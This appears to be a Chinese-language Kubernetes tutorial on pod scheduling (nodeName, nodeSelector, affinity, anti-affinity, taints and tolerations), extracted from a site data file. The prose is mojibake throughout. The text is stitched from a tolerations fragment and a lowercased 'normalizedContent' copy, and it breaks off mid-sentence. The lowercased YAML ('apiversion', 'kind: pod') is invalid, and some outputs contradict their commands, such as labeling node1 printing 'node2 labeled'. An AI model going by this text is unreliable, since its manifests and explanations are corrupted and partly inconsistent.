æ­å»ºçéç¾¤ï¼é»è®¤å°±ä¼ç» master èç¹æ·»å ä¸ä¸ªæ±¡ç¹æ è®°ï¼æä»¥ pod å°±ä¸ä¼è°åº¦å° master èç¹ä¸.\n\nå®¹å¿ï¼Tolerationï¼\n\nä¸é¢ä»ç»äºæ±¡ç¹çä½ç¨ï¼æä»¬å¯ä»¥å¨ node ä¸æ·»å æ±¡ç¹ç¨äºæç» pod è°åº¦ä¸æ¥ï¼ä½æ¯å¦æå°±æ¯æ³å°ä¸ä¸ª pod è°åº¦å°ä¸ä¸ªææ±¡ç¹ç node ä¸å»ï¼è¿æ¶ååºè¯¥æä¹åå¢ï¼è¿å°±è¦ä½¿ç¨å°å®¹å¿ã\n\n\n\n> æ±¡ç¹å°±æ¯æç»ï¼å®¹å¿å°±æ¯å¿½ç¥ï¼Node éè¿æ±¡ç¹æç» pod è°åº¦ä¸å»ï¼Pod éè¿å®¹å¿å¿½ç¥æç»\n\nä¸é¢åéè¿ä¸ä¸ªæ¡ä¾çä¸ææï¼\n\n 1. ä¸ä¸å°èï¼å·²ç»å¨ node1 èç¹ä¸æä¸äº NoExecute çæ±¡ç¹ï¼æ­¤æ¶ pod æ¯è°åº¦ä¸ä¸å»ç\n 2. æ¬å°èï¼å¯ä»¥éè¿ç» pod æ·»å å®¹å¿ï¼ç¶åå°å¶è°åº¦ä¸å»\n\nåå»º pod-toleration.yaml, åå®¹å¦ä¸\n\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-toleration\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  tolerations:      # æ·»å å®¹å¿\n  - key: "tag"        # è¦å®¹å¿çæ±¡ç¹çkey\n    operator: "Equal" # æä½ç¬¦\n    value: "heima"    # å®¹å¿çæ±¡ç¹çvalue\n    effect: "NoExecute"   # æ·»å å®¹å¿çè§åï¼è¿éå¿é¡»åæ è®°çæ±¡ç¹è§åç¸å\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n# æ·»å å®¹å¿ä¹åçpod\n[root@k8s-master01 ~]# kubectl get pods -n dev -o wide\nNAME             READY   STATUS    RESTARTS   AGE   IP       NODE     NOMINATED \npod-toleration   0/1     Pending   0          3s    <none>   <none>   <none>           \n\n# æ·»å å®¹å¿ä¹åçpod\n[root@k8s-master01 ~]# kubectl get pods -n dev -o wide\nNAME             READY   STATUS    RESTARTS   AGE   IP            NODE    NOMINATED\npod-toleration   1/1     Running   0          3s    10.244.1.62   node1   <none>        \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\nä¸é¢çä¸ä¸å®¹å¿çè¯¦ç»éç½®:\n\n[root@k8s-master01 ~]# kubectl explain pod.spec.tolerations\n......\nFIELDS:\n   key       \n   value     \n   operator  \n   effect    \n   tolerationSeconds  \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n * key å¯¹åºçè¦å®¹å¿çæ±¡ç¹çé®ï¼ç©ºæå³çå¹éææçé®\n * value å¯¹åºçè¦å®¹å¿çæ±¡ç¹çå¼\n * operator key-value çè¿ç®ç¬¦ï¼æ¯æ Equal å Existsï¼é»è®¤ï¼\n * effect å¯¹åºæ±¡ç¹ç effectï¼ç©ºæå³çå¹éææå½±å\n * tolerationSeconds å®¹å¿æ¶é´ï¼å½ effect ä¸º NoExecute æ¶çæï¼è¡¨ç¤º pod å¨ Node ä¸çåçæ¶é´',normalizedContent:'å¨é»è®¤æåµä¸ï¼ä¸ä¸ª pod å¨åªä¸ª node èç¹ä¸è¿è¡ï¼æ¯ç± scheduler ç»ä»¶éç¨ç¸åºçç®æ³è®¡ç®åºæ¥çï¼è¿ä¸ªè¿ç¨æ¯ä¸åäººå·¥æ§å¶çãä½æ¯å¨å®éä½¿ç¨ä¸­ï¼è¿å¹¶ä¸æ»¡è¶³çéæ±ï¼å ä¸ºå¾å¤æåµä¸ï¼æä»¬æ³æ§å¶æäº pod å°è¾¾æäºèç¹ä¸ï¼é£ä¹åºè¯¥æä¹åå¢ï¼è¿å°±è¦æ±äºè§£ kubernetes å¯¹ pod çè°åº¦è§åï¼kubernetes æä¾äºåå¤§ç±»è°åº¦æ¹å¼ï¼\n\n * èªå¨è°åº¦ï¼è¿è¡å¨åªä¸ªèç¹ä¸å®å¨ç± scheduler ç»è¿ä¸ç³»åçç®æ³è®¡ç®å¾åº\n * å®åè°åº¦ï¼nodenameãnodeselector\n * äº²åæ§è°åº¦ï¼nodeaffinityãpodaffinityãpodantiaffinity\n * æ±¡ç¹ï¼å®¹å¿ï¼è°åº¦ï¼taintsãtoleration\n\n\n# å®åè°åº¦\n\nå®åè°åº¦ï¼æçæ¯å©ç¨å¨ pod ä¸å£°æ nodename æè nodeselectorï¼ä»¥æ­¤å° pod è°åº¦å°ææç node èç¹ä¸ãæ³¨æï¼è¿éçè°åº¦æ¯å¼ºå¶çï¼è¿å°±æå³çå³ä½¿è¦è°åº¦çç®æ  node ä¸å­å¨ï¼ä¹ä¼åä¸é¢è¿è¡è°åº¦ï¼åªä¸è¿ pod è¿è¡å¤±è´¥èå·²ã\n\nnodename\n\nnodename ç¨äºå¼ºå¶çº¦æå° pod è°åº¦å°æå®ç name ç node èç¹ä¸ãè¿ç§æ¹å¼ï¼å¶å®æ¯ç´æ¥è·³è¿ scheduler çè°åº¦é»è¾ï¼ç´æ¥å° pod è°åº¦å°æå®åç§°çèç¹ã\n\næ¥ä¸æ¥ï¼å®éªä¸ä¸ï¼åå»ºä¸ä¸ª pod-nodename.yaml æä»¶\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-nodename\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  nodename: node1 # æå®è°åº¦å°node1èç¹ä¸\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n#åå»ºpod\n[root@k8s-master01 ~]# kubectl create -f pod-nodename.yaml\npod/pod-nodename created\n\n#æ¥çpodè°åº¦å°nodeå±æ§ï¼ç¡®å®æ¯è°åº¦å°äºnode1èç¹ä¸\n[root@k8s-master01 ~]# kubectl get pods pod-nodename -n dev -o wide\nname           ready   status    restarts   age   ip            node      ......\npod-nodename   1/1     running   0          56s   10.244.1.87   node1     ......   \n\n# æ¥ä¸æ¥ï¼å é¤podï¼ä¿®æ¹nodenameçå¼ä¸ºnode3ï¼å¹¶æ²¡ænode3èç¹ï¼\n[root@k8s-master01 ~]# kubectl delete -f pod-nodename.yaml\npod "pod-nodename" deleted\n[root@k8s-master01 ~]# vim pod-nodename.yaml\n[root@k8s-master01 ~]# kubectl create -f pod-nodename.yaml\npod/pod-nodename created\n\n#åæ¬¡æ¥çï¼åç°å·²ç»ånode3èç¹è°åº¦ï¼ä½æ¯ç±äºä¸å­å¨node3èç¹ï¼æä»¥podæ æ³æ­£å¸¸è¿è¡\n[root@k8s-master01 ~]# kubectl get pods pod-nodename -n dev -o wide\nname           ready   status    restarts   age   ip       node    ......\npod-nodename   0/1     pending   0          6s    <none>   node3   ......        \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\nnodeselector\n\nnodeselector ç¨äºå° pod è°åº¦å°æ·»å äºæå®æ ç­¾ç node èç¹ä¸ãå®æ¯éè¿ kubernetes ç label-selector æºå¶å®ç°çï¼ä¹å°±æ¯è¯´ï¼å¨ pod åå»ºä¹åï¼ä¼ç± scheduler ä½¿ç¨ matchnodeselector è°åº¦ç­ç¥è¿è¡ label å¹éï¼æ¾åºç®æ  nodeï¼ç¶åå° pod è°åº¦å°ç®æ èç¹ï¼è¯¥å¹éè§åæ¯å¼ºå¶çº¦æã\n\næ¥ä¸æ¥ï¼å®éªä¸ä¸ï¼\n\n1 é¦ååå«ä¸º node èç¹æ·»å æ ç­¾\n\n[root@k8s-master01 ~]# kubectl label nodes node1 nodeenv=pro\nnode/node2 labeled\n[root@k8s-master01 ~]# kubectl label nodes node2 nodeenv=test\nnode/node2 labeled\n\n\n1\n2\n3\n4\n\n\n2 åå»ºä¸ä¸ª pod-nodeselector.yaml æä»¶ï¼å¹¶ä½¿ç¨å®åå»º pod\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-nodeselector\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  nodeselector: \n    nodeenv: pro # æå®è°åº¦å°å·ænodeenv=proæ ç­¾çèç¹ä¸\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n#åå»ºpod\n[root@k8s-master01 ~]# kubectl create -f pod-nodeselector.yaml\npod/pod-nodeselector created\n\n#æ¥çpodè°åº¦å°nodeå±æ§ï¼ç¡®å®æ¯è°åº¦å°äºnode1èç¹ä¸\n[root@k8s-master01 ~]# kubectl get pods pod-nodeselector -n dev -o wide\nname               ready   status    restarts   age     ip          node    ......\npod-nodeselector   1/1     running   0          47s   10.244.1.87   node1   ......\n\n# æ¥ä¸æ¥ï¼å é¤podï¼ä¿®æ¹nodeselectorçå¼ä¸ºnodeenv: xxxxï¼ä¸å­å¨æææ­¤æ ç­¾çèç¹ï¼\n[root@k8s-master01 ~]# kubectl delete -f pod-nodeselector.yaml\npod "pod-nodeselector" deleted\n[root@k8s-master01 ~]# vim pod-nodeselector.yaml\n[root@k8s-master01 ~]# kubectl create -f pod-nodeselector.yaml\npod/pod-nodeselector created\n\n#åæ¬¡æ¥çï¼åç°podæ æ³æ­£å¸¸è¿è¡,nodeçå¼ä¸ºnone\n[root@k8s-master01 ~]# kubectl get pods -n dev -o wide\nname               ready   status    restarts   age     ip       node    \npod-nodeselector   0/1     pending   0          2m20s   <none>   <none>\n\n# æ¥çè¯¦æ,åç°node selectorå¹éå¤±è´¥çæç¤º\n[root@k8s-master01 ~]# kubectl describe pods pod-nodeselector -n dev\n.......\nevents:\n  type     reason            age        from               message\n  ----     ------            ----       ----               -------\n  warning  failedscheduling  <unknown>  default-scheduler  0/3 nodes are available: 3 node(s) didn\'t match node selector.\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n\n# äº²åæ§è°åº¦\n\nä»ç»äºä¸¤ç§å®åè°åº¦çæ¹å¼ï¼ä½¿ç¨èµ·æ¥éå¸¸æ¹ä¾¿ï¼ä½æ¯ä¹æä¸å®çé®é¢ï¼é£å°±æ¯å¦ææ²¡ææ»¡è¶³æ¡ä»¶ç nodeï¼é£ä¹ pod å°ä¸ä¼è¢«è¿è¡ï¼å³ä½¿å¨éç¾¤ä¸­è¿æå¯ç¨ node åè¡¨ä¹ä¸è¡ï¼è¿å°±éå¶äºå®çä½¿ç¨åºæ¯ã\n\nåºäºä¸é¢çé®é¢ï¼kubernetes è¿æä¾äºä¸ç§äº²åæ§è°åº¦ï¼affinityï¼ãå®å¨ nodeselector çåºç¡ä¹ä¸çè¿è¡äºæ©å±ï¼å¯ä»¥éè¿éç½®çå½¢å¼ï¼å®ç°ä¼åéæ©æ»¡è¶³æ¡ä»¶ç node è¿è¡è°åº¦ï¼å¦ææ²¡æï¼ä¹å¯ä»¥è°åº¦å°ä¸æ»¡è¶³æ¡ä»¶çèç¹ä¸ï¼ä½¿è°åº¦æ´å çµæ´»ã\n\naffinity ä¸»è¦åä¸ºä¸ç±»ï¼\n\n * nodeaffinity (node äº²åæ§ï¼: ä»¥ node ä¸ºç®æ ï¼è§£å³ pod å¯ä»¥è°åº¦å°åªäº node çé®é¢\n * podaffinity (pod äº²åæ§) : ä»¥ pod ä¸ºç®æ ï¼è§£å³ pod å¯ä»¥ååªäºå·²å­å¨ç pod é¨ç½²å¨åä¸ä¸ªææåä¸­çé®é¢\n * podantiaffinity (pod åäº²åæ§) : ä»¥ pod ä¸ºç®æ ï¼è§£å³ pod ä¸è½ååªäºå·²å­å¨ pod é¨ç½²å¨åä¸ä¸ªææåä¸­çé®é¢\n\n> å³äºäº²åæ§ (åäº²åæ§) ä½¿ç¨åºæ¯çè¯´æï¼\n> äº²åæ§ï¼å¦æä¸¤ä¸ªåºç¨é¢ç¹äº¤äºï¼é£å°±æå¿è¦å©ç¨äº²åæ§è®©ä¸¤ä¸ªåºç¨çå°½å¯è½çé è¿ï¼è¿æ ·å¯ä»¥åå°å ç½ç»éä¿¡èå¸¦æ¥çæ§è½æèã\n> åäº²åæ§ï¼å½åºç¨çéç¨å¤å¯æ¬é¨ç½²æ¶ï¼æå¿è¦éç¨åäº²åæ§è®©åä¸ªåºç¨å®ä¾ææ£åå¸å¨åä¸ª node ä¸ï¼è¿æ ·å¯ä»¥æé«æå¡çé«å¯ç¨æ§ã\n\nnodeaffinity\n\né¦åæ¥çä¸ä¸ nodeaffinity çå¯éç½®é¡¹ï¼\n\npod.spec.affinity.nodeaffinity\n  requiredduringschedulingignoredduringexecution  nodeèç¹å¿é¡»æ»¡è¶³æå®çææè§åæå¯ä»¥ï¼ç¸å½äºç¡¬éå¶\n    nodeselectorterms  èç¹éæ©åè¡¨\n      matchfields   æèç¹å­æ®µååºçèç¹éæ©å¨è¦æ±åè¡¨\n      matchexpressions   æèç¹æ ç­¾ååºçèç¹éæ©å¨è¦æ±åè¡¨(æ¨è)\n        key    é®\n        values å¼\n        operator å³ç³»ç¬¦ æ¯æexists, doesnotexist, in, notin, gt, lt\n  preferredduringschedulingignoredduringexecution ä¼åè°åº¦å°æ»¡è¶³æå®çè§åçnodeï¼ç¸å½äºè½¯éå¶ (å¾å)\n    preference   ä¸ä¸ªèç¹éæ©å¨é¡¹ï¼ä¸ç¸åºçæéç¸å³è\n      matchfields   æèç¹å­æ®µååºçèç¹éæ©å¨è¦æ±åè¡¨\n      matchexpressions   æèç¹æ ç­¾ååºçèç¹éæ©å¨è¦æ±åè¡¨(æ¨è)\n        key    é®\n        values å¼\n        operator å³ç³»ç¬¦ æ¯æin, notin, exists, doesnotexist, gt, lt\n\tweight å¾åæéï¼å¨èå´1-100ã\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\nå³ç³»ç¬¦çä½¿ç¨è¯´æ:\n\n- matchexpressions:\n  - key: nodeenv              # å¹éå­å¨æ ç­¾çkeyä¸ºnodeenvçèç¹\n    operator: exists\n  - key: nodeenv              # å¹éæ ç­¾çkeyä¸ºnodeenv,ä¸valueæ¯"xxx"æ"yyy"çèç¹\n    operator: in\n    values: ["xxx","yyy"]\n  - key: nodeenv              # å¹éæ ç­¾çkeyä¸ºnodeenv,ä¸valueå¤§äº"xxx"çèç¹\n    operator: gt\n    values: "xxx"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\næ¥ä¸æ¥é¦åæ¼ç¤ºä¸ä¸ requiredduringschedulingignoredduringexecution , åå»º pod-nodeaffinity-required.yaml\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-nodeaffinity-required\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  affinity:  #äº²åæ§è®¾ç½®\n    nodeaffinity: #è®¾ç½®nodeäº²åæ§\n      requiredduringschedulingignoredduringexecution: # ç¡¬éå¶\n        nodeselectorterms:\n        - matchexpressions: # å¹éenvçå¼å¨["xxx","yyy"]ä¸­çæ ç­¾\n          - key: nodeenv\n            operator: in\n            values: ["xxx","yyy"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n# åå»ºpod\n[root@k8s-master01 ~]# kubectl create -f pod-nodeaffinity-required.yaml\npod/pod-nodeaffinity-required created\n\n# æ¥çpodç¶æ ï¼è¿è¡å¤±è´¥ï¼\n[root@k8s-master01 ~]# kubectl get pods pod-nodeaffinity-required -n dev -o wide\nname                        ready   status    restarts   age   ip       node    ...... \npod-nodeaffinity-required   0/1     pending   0          16s   <none>   <none>  ......\n\n# æ¥çpodçè¯¦æ\n# åç°è°åº¦å¤±è´¥ï¼æç¤ºnodeéæ©å¤±è´¥\n[root@k8s-master01 ~]# kubectl describe pod pod-nodeaffinity-required -n dev\n......\n  warning  failedscheduling  <unknown>  default-scheduler  0/3 nodes are available: 3 node(s) didn\'t match node selector.\n  warning  failedscheduling  <unknown>  default-scheduler  0/3 nodes are available: 3 node(s) didn\'t match node selector.\n\n#æ¥ä¸æ¥ï¼åæ­¢pod\n[root@k8s-master01 ~]# kubectl delete -f pod-nodeaffinity-required.yaml\npod "pod-nodeaffinity-required" deleted\n\n# ä¿®æ¹æä»¶ï¼å°values: ["xxx","yyy"]------\x3e ["pro","yyy"]\n[root@k8s-master01 ~]# vim pod-nodeaffinity-required.yaml\n\n# åæ¬¡å¯å¨\n[root@k8s-master01 ~]# kubectl create -f pod-nodeaffinity-required.yaml\npod/pod-nodeaffinity-required created\n\n# æ­¤æ¶æ¥çï¼åç°è°åº¦æåï¼å·²ç»å°podè°åº¦å°äºnode1ä¸\n[root@k8s-master01 ~]# kubectl get pods pod-nodeaffinity-required -n dev -o wide\nname                        ready   status    restarts   age   ip            node  ...... \npod-nodeaffinity-required   1/1     running   0          11s   10.244.1.89   node1 ......\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\næ¥ä¸æ¥åæ¼ç¤ºä¸ä¸ requiredduringschedulingignoredduringexecution , åå»º pod-nodeaffinity-preferred.yaml\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-nodeaffinity-preferred\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  affinity:  #äº²åæ§è®¾ç½®\n    nodeaffinity: #è®¾ç½®nodeäº²åæ§\n      preferredduringschedulingignoredduringexecution: # è½¯éå¶\n      - weight: 1\n        preference:\n          matchexpressions: # å¹éenvçå¼å¨["xxx","yyy"]ä¸­çæ ç­¾(å½åç¯å¢æ²¡æ)\n          - key: nodeenv\n            operator: in\n            values: ["xxx","yyy"]\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n# åå»ºpod\n[root@k8s-master01 ~]# kubectl create -f pod-nodeaffinity-preferred.yaml\npod/pod-nodeaffinity-preferred created\n\n# æ¥çpodç¶æ ï¼è¿è¡æåï¼\n[root@k8s-master01 ~]# kubectl get pod pod-nodeaffinity-preferred -n dev\nname                         ready   status    restarts   age\npod-nodeaffinity-preferred   1/1     running   0          40s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n> nodeaffinity è§åè®¾ç½®çæ³¨æäºé¡¹ï¼\n> 1 å¦æåæ¶å®ä¹äº nodeselector å nodeaffinityï¼é£ä¹å¿é¡»ä¸¤ä¸ªæ¡ä»¶é½å¾å°æ»¡è¶³ï¼pod æè½è¿è¡å¨æå®ç node ä¸\n> 2 å¦æ nodeaffinity æå®äºå¤ä¸ª nodeselectortermsï¼é£ä¹åªéè¦å¶ä¸­ä¸ä¸ªè½å¤å¹éæåå³å¯\n> 3 å¦æä¸ä¸ª nodeselectorterms ä¸­æå¤ä¸ª matchexpressions ï¼åä¸ä¸ªèç¹å¿é¡»æ»¡è¶³ææçæè½å¹éæå\n> 4 å¦æä¸ä¸ª pod æå¨ç node å¨ pod è¿è¡æé´å¶æ ç­¾åçäºæ¹åï¼ä¸åç¬¦åè¯¥ pod çèç¹äº²åæ§éæ±ï¼åç³»ç»å°å¿½ç¥æ­¤åå\n\npodaffinity\npodaffinity ä¸»è¦å®ç°ä»¥è¿è¡ç pod ä¸ºåç§ï¼å®ç°è®©æ°åå»ºç pod è·åç§ pod å¨ä¸ä¸ªåºåçåè½ãé¦åæ¥çä¸ä¸ podaffinity çå¯éç½®é¡¹ï¼\n\npod.spec.affinity.podaffinity\n  requiredduringschedulingignoredduringexecution  ç¡¬éå¶\n    namespaces       æå®åç§podçnamespace\n    topologykey      æå®è°åº¦ä½ç¨å\n    labelselector    æ ç­¾éæ©å¨\n      matchexpressions  æèç¹æ ç­¾ååºçèç¹éæ©å¨è¦æ±åè¡¨(æ¨è)\n        key    é®\n        values å¼\n        operator å³ç³»ç¬¦ æ¯æin, notin, exists, doesnotexist.\n      matchlabels    æå¤ä¸ªmatchexpressionsæ å°çåå®¹\n  preferredduringschedulingignoredduringexecution è½¯éå¶\n    podaffinityterm  éé¡¹\n      namespaces      \n      topologykey\n      labelselector\n        matchexpressions  \n          key    é®\n          values å¼\n          operator\n        matchlabels \n    weight å¾åæéï¼å¨èå´1-100\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n> topologykey ç¨äºæå®è°åº¦æ¶ä½ç¨åï¼ä¾å¦:\n> å¦ææå®ä¸º kubernetes.io/hostnameï¼é£å°±æ¯ä»¥ node èç¹ä¸ºåºåèå´\n> å¦ææå®ä¸º beta.kubernetes.io/os, åä»¥ node èç¹çæä½ç³»ç»ç±»åæ¥åºå\n\næ¥ä¸æ¥ï¼æ¼ç¤ºä¸ requiredduringschedulingignoredduringexecution\n1ï¼é¦ååå»ºä¸ä¸ªåç§ podï¼pod-podaffinity-target.yamlï¼\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-podaffinity-target\n  namespace: dev\n  labels:\n    podenv: pro #è®¾ç½®æ ç­¾\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  nodename: node1 # å°ç®æ podåç¡®æå®å°node1ä¸\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n# å¯å¨ç®æ pod\n[root@k8s-master01 ~]# kubectl create -f pod-podaffinity-target.yaml\npod/pod-podaffinity-target created\n\n# æ¥çpodç¶åµ\n[root@k8s-master01 ~]# kubectl get pods  pod-podaffinity-target -n dev\nname                     ready   status    restarts   age\npod-podaffinity-target   1/1     running   0          4s\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n2ï¼åå»º pod-podaffinity-required.yamlï¼åå®¹å¦ä¸ï¼\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-podaffinity-required\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  affinity:  #äº²åæ§è®¾ç½®\n    podaffinity: #è®¾ç½®podäº²åæ§\n      requiredduringschedulingignoredduringexecution: # ç¡¬éå¶\n      - labelselector:\n          matchexpressions: # å¹éenvçå¼å¨["xxx","yyy"]ä¸­çæ ç­¾\n          - key: podenv\n            operator: in\n            values: ["xxx","yyy"]\n        topologykey: kubernetes.io/hostname\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\nä¸é¢éç½®è¡¨è¾¾çæææ¯ï¼æ° pod å¿é¡»è¦ä¸æ¥ææ ç­¾ nodeenv=xxx æè nodeenv=yyy ç pod å¨åä¸ node ä¸ï¼æ¾ç¶ç°å¨æ²¡æè¿æ · podï¼æ¥ä¸æ¥ï¼è¿è¡æµè¯ä¸ä¸ã\n\n# å¯å¨pod\n[root@k8s-master01 ~]# kubectl create -f pod-podaffinity-required.yaml\npod/pod-podaffinity-required created\n\n# æ¥çpodç¶æï¼åç°æªè¿è¡\n[root@k8s-master01 ~]# kubectl get pods pod-podaffinity-required -n dev\nname                       ready   status    restarts   age\npod-podaffinity-required   0/1     pending   0          9s\n\n# æ¥çè¯¦ç»ä¿¡æ¯\n[root@k8s-master01 ~]# kubectl describe pods pod-podaffinity-required  -n dev\n......\nevents:\n  type     reason            age        from               message\n  ----     ------            ----       ----               -------\n  warning  failedscheduling  <unknown>  default-scheduler  0/3 nodes are available: 2 node(s) didn\'t match pod affinity rules, 1 node(s) had taints that the pod didn\'t tolerate.\n\n# æ¥ä¸æ¥ä¿®æ¹  values: ["xxx","yyy"]-----\x3evalues:["pro","yyy"]\n# æææ¯ï¼æ°podå¿é¡»è¦ä¸æ¥ææ ç­¾nodeenv=xxxæènodeenv=yyyçpodå¨åä¸nodeä¸\n[root@k8s-master01 ~]# vim pod-podaffinity-required.yaml\n\n# ç¶åéæ°åå»ºpodï¼æ¥çææ\n[root@k8s-master01 ~]# kubectl delete -f  pod-podaffinity-required.yaml\npod "pod-podaffinity-required" deleted\n[root@k8s-master01 ~]# kubectl create -f pod-podaffinity-required.yaml\npod/pod-podaffinity-required created\n\n# åç°æ­¤æ¶podè¿è¡æ­£å¸¸\n[root@k8s-master01 ~]# kubectl get pods pod-podaffinity-required -n dev\nname                       ready   status    restarts   age   labels\npod-podaffinity-required   1/1     running   0          6s    <none>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\nå³äº podaffinity ç preferredduringschedulingignoredduringexecution ï¼è¿éä¸åæ¼ç¤ºã\npodantiaffinity\n\npodantiaffinity ä¸»è¦å®ç°ä»¥è¿è¡ç pod ä¸ºåç§ï¼è®©æ°åå»ºç pod è·åç§ pod ä¸å¨ä¸ä¸ªåºåä¸­çåè½ã\n\nå®çéç½®æ¹å¼åéé¡¹è· podaffinty æ¯ä¸æ ·çï¼è¿éä¸ååè¯¦ç»è§£éï¼ç´æ¥åä¸ä¸ªæµè¯æ¡ä¾ã\n\n1ï¼ç»§ç»­ä½¿ç¨ä¸ä¸ªæ¡ä¾ä¸­ç®æ  pod\n\n[root@k8s-master01 ~]# kubectl get pods -n dev -o wide --show-labels\nname                     ready   status    restarts   age     ip            node    labels\npod-podaffinity-required 1/1     running   0          3m29s   10.244.1.38   node1   <none>     \npod-podaffinity-target   1/1     running   0          9m25s   10.244.1.37   node1   podenv=pro\n\n\n1\n2\n3\n4\n\n\n2ï¼åå»º pod-podantiaffinity-required.yamlï¼åå®¹å¦ä¸ï¼\n\napiversion: v1\nkind: pod\nmetadata:\n  name: pod-podantiaffinity-required\n  namespace: dev\nspec:\n  containers:\n  - name: nginx\n    image: nginx:1.17.1\n  affinity:  #äº²åæ§è®¾ç½®\n    podantiaffinity: #è®¾ç½®podäº²åæ§\n      requiredduringschedulingignoredduringexecution: # ç¡¬éå¶\n      - labelselector:\n          matchexpressions: # å¹épodenvçå¼å¨["pro"]ä¸­çæ ç­¾\n          - key: podenv\n            operator: in\n            values: ["pro"]\n        topologykey: kubernetes.io/hostname\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\nä¸é¢éç½®è¡¨è¾¾çæææ¯ï¼æ° pod å¿é¡»è¦ä¸æ¥ææ ç­¾ nodeenv=pro ç pod ä¸å¨åä¸ node ä¸ï¼è¿è¡æµè¯ä¸ä¸ã\n\n# åå»ºpod\n[root@k8s-master01 ~]# kubectl create -f pod-podantiaffinity-required.yaml\npod/pod-podantiaffinity-required created\n\n# æ¥çpod\n# åç°è°åº¦å°äºnode2ä¸\n[root@k8s-master01 ~]# kubectl get pods pod-podantiaffinity-required -n dev -o wide\nname                           ready   status    restarts   age   ip            node   .. \npod-podantiaffinity-required   1/1     running   0          30s   10.244.1.96   node2  ..\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# æ±¡ç¹åå®¹å¿\n\næ±¡ç¹ï¼taintsï¼\n\nåé¢çè°åº¦æ¹å¼é½æ¯ç«å¨ pod çè§åº¦ä¸ï¼éè¿å¨ pod ä¸æ·»å å±æ§ï¼æ¥ç¡®å® pod æ¯å¦è¦è°åº¦å°æå®ç node ä¸ï¼å¶å®æä»¬ä¹å¯ä»¥ç«å¨ node çè§åº¦ä¸ï¼éè¿å¨ node ä¸æ·»å æ±¡ç¹å±æ§ï¼æ¥å³å®æ¯å¦åè®¸ pod è°åº¦è¿æ¥ã\n\nnode è¢«è®¾ç½®ä¸æ±¡ç¹ä¹åå°±å pod ä¹é´å­å¨äºä¸ç§ç¸æ¥çå³ç³»ï¼è¿èæç» pod è°åº¦è¿æ¥ï¼çè³å¯ä»¥å°å·²ç»å­å¨ç pod é©±éåºå»ã\n\næ±¡ç¹çæ ¼å¼ä¸ºï¼ key=value:effect , key å value æ¯æ±¡ç¹çæ ç­¾ï¼effect æè¿°æ±¡ç¹çä½ç¨ï¼æ¯æå¦ä¸ä¸ä¸ªéé¡¹ï¼\n\n * prefernoscheduleï¼kubernetes å°å°½éé¿åæ pod è°åº¦å°å·æè¯¥æ±¡ç¹ç node ä¸ï¼é¤éæ²¡æå¶ä»èç¹å¯è°åº¦\n * noscheduleï¼kubernetes å°ä¸ä¼æ pod è°åº¦å°å·æè¯¥æ±¡ç¹ç node ä¸ï¼ä½ä¸ä¼å½±åå½å node ä¸å·²å­å¨ç pod\n * noexecuteï¼kubernetes å°ä¸ä¼æ pod è°åº¦å°å·æè¯¥æ±¡ç¹ç node ä¸ï¼åæ¶ä¹ä¼å° node ä¸å·²å­å¨ç pod é©±ç¦»\n\n\n\nä½¿ç¨ kubectl è®¾ç½®åå»é¤æ±¡ç¹çå½ä»¤ç¤ºä¾å¦ä¸ï¼\n\n# è®¾ç½®æ±¡ç¹\nkubectl taint nodes èç¹åç§° key=value:effect\n\n# å»é¤æ±¡ç¹\nkubectl taint nodes èç¹åç§° key:effect-\n\n# å»é¤æææ±¡ç¹\nkubectl taint nodes èç¹åç§° key-\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\næ¥ä¸æ¥ï¼æ¼ç¤ºä¸æ±¡ç¹çææï¼\n\n 1. åå¤èç¹ node1ï¼ä¸ºäºæ¼ç¤ºæææ´å 